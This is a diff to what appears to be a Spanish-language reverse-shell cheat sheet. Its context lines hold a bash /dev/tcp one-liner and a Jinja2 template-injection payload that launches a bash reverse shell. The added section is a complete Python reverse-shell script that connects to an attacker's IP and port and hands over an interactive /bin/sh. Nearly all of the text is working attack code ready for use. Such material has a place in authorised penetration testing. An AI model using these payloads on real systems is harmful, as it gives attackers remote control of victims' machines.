@@ -55,3 +55,31 @@ sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
 ```
+
+## Script en Python
+```bash
+#!/bin/python3
+
+# reverse_shell.py
+import socket
+import subprocess
+import os
+
+# Cambia la IP y el puerto a los de tu máquina atacante
+HOST = '<IP>'
+PORT = <PORT>
+
+def reverse_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    
+    # Redirige la entrada, salida y errores al socket
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    
+    # Inicia una shell interactiva
+    subprocess.call(['/bin/sh', '-i'])
+
+reverse_shell()
+```
